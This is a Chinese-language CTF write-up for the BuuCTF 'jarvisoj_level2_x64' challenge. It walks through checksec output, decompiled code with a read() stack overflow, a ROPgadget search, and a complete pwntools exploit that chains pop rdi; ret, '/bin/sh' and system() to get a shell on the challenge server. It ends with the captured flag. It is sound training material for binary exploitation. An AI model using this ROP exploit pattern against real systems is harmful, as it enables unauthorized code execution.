---
tags:
  - BuuCTF
  - 简单
  - ROP
---

# jarvisoj_level2_x64

## 前置工作

先 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec level2_x64
[*] '/home/ela/Pwn/level2_x64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开启了 NX，排除 ShellCode

用 IDA 64 打开主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  return system("echo 'Hello World!'");
}
```

在看一下函数 `vulnerable_function()`

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  system("echo Input:");
  return read(0, buf, 0x200uLL);
}
```

感觉像可以构造 ROP 链，有 `system()`，地址为 `0x4004c0`

再 Shift + F12 找一下 `/bin/sh`，也有，地址为 `0x600a90`

思路已经很清晰了，在 `vulnerable_function()` 中的 `read()` 函数中造成栈溢出，然后执行 ROP 链，现在少一个 `pop rdi; ret` 的地址

于是使用 ROPgadget 查找，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary level2_x64 --only "pop|rdi|ret"
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400560 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004a1 : ret

Unique gadgets found: 11
```

找到可利用的 `pop rdi; ret` 地址为 `0x4006b3`

接下来就可以构建 Exp

## 编写 Exp

```python
from pwn import *

io = remote("node4.buuoj.cn", 28252)
elf = ELF("./level2_x64")

system_addr = 0x4004c0
bin_sh_addr = 0x600a90
pop_rdi_ret = 0x4006b3

payload = b"A"*(0x80+0x8) + pack(pop_rdi_ret, 64) + pack(bin_sh_addr, 64) + pack(system_addr, 64)
io.sendline(payload)

io.interactive()

```

很简单，最后得到的 Flag 为 `flag{3564fa65-d4d2-47d9-a9c9-2187cc2bb947}`